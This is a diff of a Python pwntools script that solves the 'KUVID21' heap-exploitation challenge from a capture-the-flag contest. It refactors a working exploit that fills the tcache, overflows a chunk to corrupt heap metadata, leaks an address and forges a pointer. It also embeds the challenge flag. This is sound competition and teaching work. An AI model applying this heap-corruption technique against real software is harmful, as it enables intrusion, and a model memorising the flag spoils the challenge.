@@ -4,397 +4,108 @@ import random
 import pwn
 import time
 
-pwn.context.log_level = 'error'
 
 #cd21{m1t1g4t10ns_4r3_n0_us3_4g41nst_m3}
 
-infectCount = 0
-def infect(conn, first, last, allergies):
-    global infectCount
-    print(f'infecting: {infectCount}')
-    infectCount+=1
-    line = conn.recvuntil('Your choice:')
-    conn.sendline(b'1')
-    conn.recvuntil('Firstaddress:\n')
-    conn.send(first)
-    conn.recvuntil('Lastaddress:\n')
-    conn.send(last)
-    conn.recvuntil('Allergies:\n')
-    conn.send(allergies)
-    res = '\n'.join([line.decode('ascii') for line in conn.recvlines(4)])
-    return res
+def log(st):
+    print(st)
 
-def cure(conn, i):
-    conn.recvuntil('Your choice:\n')
-    conn.sendline(b'2')
-    conn.recvuntil('Who to cure?\n')
-    conn.sendline(str(i))
+class Block:
+    def __init__(self, conn, index, info):
+        self.conn = conn
+        self.index = index
+        self.info = info
 
-    res = conn.recvline().decode('ascii')
-    print(f'cure {i}: {res}')
-    if 'cd21{' in res:
-        sys.exit()
+    def cure(self):
+        self.conn.recvuntil('Your choice:\n')
+        self.conn.sendline(b'2')
+        self.conn.recvuntil('Who to cure?\n')
+        self.conn.sendline(str(self.index))
+
+        res = self.conn.recvline().decode('ascii')
+        log(f'cure {self.index}: {res}')
        
+        line = self.conn.recvuntil('Alright').decode('ascii')
+        return res
 
-    line = conn.recvuntil('Alright').decode('ascii')
-    if 'This chunk is not infected with KUPAC virus. Thank the ALLOCATOR!' in line:
-        print('cannot cure')
+class Challenge:
 
-def crash(conn):
-    k = 0
-    r = infect(conn, b'aaaa', b'bbbb', f'12345678901234567 k={k} 23456789012345')
-    r = infect(conn, b'aaaa', b'bbbb', f'12345678901234567 k={k} 23456789012345')
-    cure(conn, 0)
-    r = infect(conn, b'aaaa', b'bbbb', f'12345678901234567 k={k} 23456789012345')
+    def __init__(self, conn):
+        self.infectionCount = 0
+        self.conn = conn
+
+    def infect(self, first, last, allergies):
+        log(f'Infecting #{self.infectionCount}')
+        line = self.conn.recvuntil('Your choice:')
+        self.conn.sendline(b'1')
+        self.conn.recvuntil('Firstaddress:\n')
+        self.conn.send(first)
+        self.conn.recvuntil('Lastaddress:\n')
+        self.conn.send(last)
+        self.conn.recvuntil('Allergies:\n')
+        self.conn.send(allergies)
+        res = '\n'.join([line.decode('ascii') for line in self.conn.recvlines(4)])
+
+        self.infectionCount += 1 
+
+        log(res)
+        return Block(self.conn, self.infectionCount - 1, res)
+
+    def spread_virus(self, block_count):
+        log(f'Virus is spreading to {block_count} blocks')
+        time.sleep(5 * block_count)
+
+        blocks = [Block(self.conn, i + self.infectionCount, 'infected by KUVID') for i in range(block_count)]
+        self.infectionCount += block_count
+        return blocks
+
+
+def solve(challenge):
+
+    # let the virus spread 7 times so that we can free these blocks
+    # to fill the tcache. later blocks of this size will be moved
+    # to the small bucket list, and will do chunk merging
+
+    blocks_to_fill_tcache = challenge.spread_virus(7)
     
-    conn.recvuntil('Your choice:\n')
-    conn.sendline(b'2')
-    conn.recvuntil('Who to cure?\n')
-    conn.sendline(str(1))
-    print(conn.recvall())
+    challenge.infect(b'x'*7, b'w'*7, f'e' * 0x22)
+    block_to_be_corrupted = challenge.spread_virus(1)[0]
 
+    challenge.infect(b'x'*7, b'w'*7, f'V4CC1N3V4CC1N3V4CC1N3V4CC1N3V4CC1N3')
 
-def reuse(i):
-    global infectCount
-
-    #conn = pwn.remote('challenges.crysys.hu', 5009)
-    conn = pwn.process('./KUVID21')
-
+    block_with_ptr_to_block_to_be_corrupted = challenge.spread_virus(1)[0]
+    overflow_block_position = challenge.infect(b'x'*7, b'w'*7, f'e'*0x22)
     
-    time.sleep(5 * 8 + 1)
-    
-    cure(conn, 0)
-    cure(conn, 1)
-    cure(conn, 2)
-    cure(conn, 3)
-    cure(conn, 4)
-    cure(conn, 5)
-    cure(conn, 6)
-    cure(conn, 7)
+    to_be_freed = challenge.spread_virus(1)[0]
 
-    r = infect(conn, b'x', b'y', f'@')
-    print(r)
+    for block in blocks_to_fill_tcache:
+        block.cure()
 
+    block_with_ptr_to_block_to_be_corrupted.cure()
 
-def crash_when_overwrite(i):
-    global infectCount
+    block_to_be_corrupted.cure()
 
-    #conn = pwn.remote('challenges.crysys.hu', 5009)
-    #conn = pwn.process('./KUVID21')
+    overflow_block_position.cure()
+    overflow_block = challenge.infect(
+        b'x'*7, b'w'*7, b'e'*(0x24 - 8) + b'\x60\x02\x00\x00\x00\x00\x00\x00')
 
-    
-    time.sleep(5*7 + 1)
-    
-    r = infect(conn, b'x', b'y', f'@')
-    print(r)
-
-    time.sleep(5 + 1)
-
-    cure(conn, 7)
-    r = infect(conn, b'x', b'y', f'@'*0x24)
-
-    cure(conn, 0)
-    cure(conn, 1)
-    cure(conn, 2)
-    cure(conn, 3)
-    cure(conn, 4)
-    cure(conn, 5)
-    cure(conn, 6)
-
-    cure(conn, 8)
-
-def corrupted_double_linked_list(i):
-    # global infectCount
-
-    # #conn = pwn.remote('challenges.crysys.hu', 5009)
-    # conn = pwn.process('./KUVID21')
-
-    # time.sleep(5*7 + 1)
-    
-    # r = infect(conn, b'x', b'y', f'@')
-    # print(r)
-
-    # time.sleep(5 + 1)
-
-    # cure(conn, 7)
-    # r = infect(conn, b'\x00', b'w', f'e')
-
-
-    # print(r)
-    # r = r.split("\n")[0][8:(8+7*3-1)]
-    # r = '59 55 55 55 05 00 00'
-    # r = 'f9 c7 00 00 50 55 00'
-    # r = '10 90 55 55 55 55 00'
-
-    # next_lofasz = bytes([int(byte, 16) for byte in r.split(' ')])
-    # print(next_lofasz)
-    
-    # cure(conn, 9)
-
-   
-   
-    # payload =  (
-    #     b"\x00\x00\x00\x00" +
-    #     b"V4CCIN3\x00" +
-    #     b"\x00\x00\x00\x00\x00\x00\x00\x00" +
-    #     b"\x00\x00\x00\x00\x00\x00\x00\x00" +
-    #     b"\x38\x00\x00\x00\x00\x00\x00\x00"
-    # )
-
-    # # payload =  (
-    # #     b"V4CC" +
-    # #     b"\x21\x00\x00\x00\x00\x00\x00\x00" +
-    # #     #b"\x59\x55\x55\x05\x00\x00\x00\x00" +
-    # #     b"\x00\x00\x00\x00\x00\x00\x00\x00" +
-    # #     b"\x10\x90\x55\x55\x55\x55\x00\x00" +
-    # #     b"\x20\x00\x00\x00\x00\x00\x00\x00"
-    # # )
-
-    # assert len(payload) == 0x24
-
-    # r = infect(conn, 
-    #     b"\x39\x00\x00\x00\x00\x00\x00",
-    #     # b"\x59\x55\x55\x05\x00\x00\x00", 
-    #     b"\x10\x90\x55\x55\x55\x55\x00", 
-    #     payload
-    # )
-    # print(r)
-
-    # cure(conn, 0)
-    # cure(conn, 1)
-    # cure(conn, 2)
-    # cure(conn, 3)
-    # cure(conn, 4)
-    # cure(conn, 5)
-    # cure(conn, 6)
-
-    # # cure(conn, 10)
-
-    # #itt szall szet az 
-    # # _int_free 0x7ffff7e7ecf0
-    # # gdb -pid `ps -aux  | grep './KUVID21' | head -n 1 | cut -f6 -d$' '` 
-
-    # print('curing 8')
-    # conn.recvuntil('Your choice:\n')
-    # conn.sendline(b'2')
-    # print('>>> press enter')
-    # input()
-    # conn.recvuntil('Who to cure?\n')
-    # conn.sendline(str(8))
-    # print(conn.recvline())
-    # print(conn.recvline())
-
-    # r = infect(conn, b'x', b'y', f'IN3\x00')
-    # print(r)
-    pass
-
-
-
-def free8big():
-    global infectCount
-
-    #conn = pwn.remote('challenges.crysys.hu', 5009)
-    conn = pwn.process('./KUVID21')
-
-    time.sleep(5*7+ 2)
-    
-    r = infect(conn, b'x'*7, b'w'*7, f'e'*0x22)
-    print(r)
-
-    time.sleep(5)
-
-    r = infect(conn, b'x'*7, b'w'*7, f'e'*0x22)
-    print(r)
-
-    time.sleep(5)
-
-    r = infect(conn, b'x'*7, b'w'*7, f'e'*0x22)
-    print(r)
-
-    time.sleep(5)
-
-
-    cure(conn, 0)
-    cure(conn, 1)
-    cure(conn, 2)
-    cure(conn, 3)
-    cure(conn, 4)
-    cure(conn, 5)
-    cure(conn, 6)
-
-
-    cure(conn, 10)
-
-    cure(conn, 8)
-
-    print("--------")
-    print("enter to CONTINUE")
-    input()
-
-    r = infect(conn, b'\x00', b'\x00', f'\x00')
-    print(r)
-    # r = infect(conn, b'\x00', b'\x00', f'\x00')
-    # print(r)
-    # r = infect(conn, b'\x00', b'\x00', f'\x00')
-    # print(r)
-    # r = infect(conn, b'\x00', b'\x00', f'\x00')
-    # print(r)
-    # r = infect(conn, b'\x00', b'\x00', f'\x00')
-    # print(r)
-    # r = infect(conn, b'\x00', b'\x00', f'\x00')
-    # print(r)
-    # r = infect(conn, b'\x00', b'\x00', f'\x00')
-    # print(r)
-    # r = infect(conn, b'\x00', b'\x00', f'\x00')
-    # print(r)
-
-   
-
-    print('>>> press [Enter] to quit')
-    input()
-
-def crash2():
-    global infectCount
-
-    #conn = pwn.remote('challenges.crysys.hu', 5009)
-    conn = pwn.process('./KUVID21')
-
-    time.sleep(5*7 + 1)
-    
-    r = infect(conn, b'x', b'y', f'@')
-    print(r)
-
-    time.sleep(5 + 1)
-
-    cure(conn, 7)
-    r = infect(conn, b'\x00', b'w', f'e')
-
-
-    print(r)
-    r = r.split("\n")[0][8:(8+7*3-1)]
-    r = '59 55 55 55 05 00 00'
-    r = 'f9 c7 00 00 50 55 00'
-    r = '10 90 55 55 55 55 00'
-
-    next_lofasz = bytes([int(byte, 16) for byte in r.split(' ')])
-    print(next_lofasz)
-    
-    cure(conn, 9)
-
-    # payload =  (
-    #     b"V4CCIN3\x00" +
-    #     b"\x00\x00\x00\x00" +
-    #     b"\x00\x00\x00\x00\x00\x00\x00\x00" +
-    #     b"\x00\x00\x00\x00\x00\x00\x00\x00" +
-    #     b"\x38\x00\x00\x00\x00\x00\x00\x00"
-    # )
-
-    payload =  (
-        b"V4CC" +
-        b"\x21\x00\x00\x00\x00\x00\x00\x00" +
-        b"\xb0\x99\x55\x55\x55\x55\x00\x00" + 
-        b"\xb0\x99\x55\x55\x55\x55\x00\x00" +
-        b"\x20\x00\x00\x00\x00\x00\x00\x00"
-    )
-
-    assert len(payload) == 0x24
-
-    r = infect(conn, 
-        b"x",
-        b"y", 
-        payload
-    )
-    print(r)
-
-    cure(conn, 0)
-    cure(conn, 1)
-    cure(conn, 2)
-    cure(conn, 3)
-    cure(conn, 4)
-    cure(conn, 5)
-    cure(conn, 6)
-
-    # cure(conn, 10)
-
-    #itt szall szet az 
-    # _int_free 0x7ffff7e7ecf0
-    # gdb -pid `ps -aux  | grep './KUVID21' | head -n 1 | cut -f6 -d$' '` 
-
-    print('curing 8')
-    conn.recvuntil('Your choice:\n')
-    conn.sendline(b'2')
-    print('>>> press enter')
-    input()
-    conn.recvuntil('Who to cure?\n')
-    conn.sendline(str(8))
-    print(conn.recvline())
-    print(conn.recvline())
-
-    r = infect(conn, b'x', b'y', f'IN3\x00')
-    print(r)
-
-  
-def solve(to_be_guessed):
-    global infectCount
-
-    conn = pwn.remote('challenges.crysys.hu', 5009)
-    #conn = pwn.process('./KUVID21')
-
-    time.sleep(5*7)
-    
-    r = infect(conn, b'x'*7, b'w'*7, f'e' * 0x22)
-    print(r)
-
-    time.sleep(5)
-
-    r = infect(conn, b'x'*7, b'w'*7, f'V4CC1N3V4CC1N3V4CC1N3V4CC1N3V4CC1N3')
-    print(r)
-
-    time.sleep(5)
-
-    r = infect(conn, b'x'*7, b'w'*7, f'e'*0x22)
-    print(r)
-    
-    time.sleep(5)
-    cure(conn, 0)
-    cure(conn, 1)
-    cure(conn, 2)
-    cure(conn, 3)
-    cure(conn, 4)
-    cure(conn, 5)
-    cure(conn, 6)
-
-
-    cure(conn, 10)
-
-    cure(conn, 8)
-
-    cure(conn, 11)
-    r = infect(conn, b'x'*7, b'w'*7, b'e'*(0x24 - 8) + b'\x60\x02\x00\x00\x00\x00\x00\x00')
-    print(r)
-
-    r = infect(conn, b'\x00', b'\x00', f'\x00')
-    print(r)
+    r = challenge.infect(b'\x00', b'\x00', f'\x00').info
     r = r.split("\n")[0][32:(32+7*3-1)]
-    print(r)
 
     address_bytes = [int(byte, 16) for byte in r.split(' ')]
-
     address = int.from_bytes(address_bytes,'little') 
-    address += to_be_guessed + 0x10
-
+    # the lowest byte of the address is masked (0x00)
+    # but we know from the binary that it should be 0xe0
+    # this is not affected by ASLR, because it doesnt modify the 
+    # lowest 12 bits of the address
+    # add 0x10 to shift the beginning of the block
+    address += 0xe0 + 0x10
     address_bytes = address.to_bytes(8, 'little') 
-    print(address_bytes) 
 
-    r = infect(conn, b'\x00', b'\x00', f'\x00')
-    print(r)
-    r = infect(conn, b'\x00', b'\x00', f'\x00')
-    print(r)
-    r = infect(conn, b'\x00', b'\x00', f'\x00')
-    print(r)
+    for i in range(3):
+        challenge.infect(b'\x00', b'\x00', f'\x00')
     
-    
-    r = infect(conn, 
+    challenge.infect(
         b'\x88\x88\x88\x88', 
         b'\x00', (
             b'\x00\x00\x00\x00' +
@@ -403,60 +114,21 @@ def solve(to_be_guessed):
             address_bytes
             
         ))
-    print(r)
 
-    cure(conn, 12)
+    to_be_freed.cure()
 
-    print('heap corrupted')
+    log('heap corrupted')
 
-    r = infect(conn, b'\x00', b'\x00', f'\x00')
-    print(r)
-    r = infect(conn, b'\x00', b'\x00', f'\x00')
-    print(r)
-    r = infect(conn, b'\x00', b'\x00', f'\x00')
-    print(r)
-    r = infect(conn, b'\x00', b'\x00', f'\x00')
-    print(r)
-    r = infect(conn, b'\x00', b'\x00', f'\x00')
-    print(r)
-    r = infect(conn, b'\x00', b'\x00', f'\x00')
-    print(r)
-    r = infect(conn, b'\x00', b'\x00', f'\x00')
-    print(r)
-    r = infect(conn, b'\x00', b'\x00', f'1N3\x00')
-    print(r)
-    r = infect(conn, b'\x00', b'\x00', f'1N3\x00')
-    print(r)
-    r = infect(conn, b'\x00', b'\x00', f'1N3\x00')
-    print(r)
-    r = infect(conn, b'\x00', b'\x00', f'1N3\x00')
-    print(r)
-    r = infect(conn, b'\x00', b'\x00', f'1N3\x00')
-    print(r)
-    r = infect(conn, b'\x00', b'\x00', f'1N3\x00')
-    print(r)
-    r = infect(conn, b'\x00', b'\x00', f'1N3\x00')
-    print(r)
-    r = infect(conn, b'\x00', b'\x00', f'1N3\x00')
-    print(r)
-    r = infect(conn, b'\x00', b'\x00', f'1N3\x00')
-    print(r)
-    r = infect(conn, b'\x00', b'\x00', f'1N3\x00')
-    print(r)
-  
-    cure(conn, 26)
-    sys.exit(0)
+    for i in range(7):
+        challenge.infect(b'\x00', b'\x00', f'\x00')
+
+    return challenge.infect(b'\x00', b'\x00', f'1N3\x00').cure()
 
 
+pwn.context.log_level = 'error'
 
-while True:
-    try:
-        to_be_guessed = random.choice([
-            0x00, 0x10, 0x20, 0x30, 0x40, 0x50, 0x60, 0x70,
-            0x80, 0x90, 0xa0, 0xb0, 0xc0, 0xd0, 0xe0, 0xf0]
-        )
-        # to_be_guessed = 0x40
-        print(f'------------ {hex(to_be_guessed)} ------------')
-        solve(to_be_guessed)   
-    except Exception:
-        pass
+
+conn = pwn.remote('challenges.crysys.hu', 5009)
+# conn = pwn.process('./KUVID21')
+flag = solve(Challenge(conn))
+print(flag)
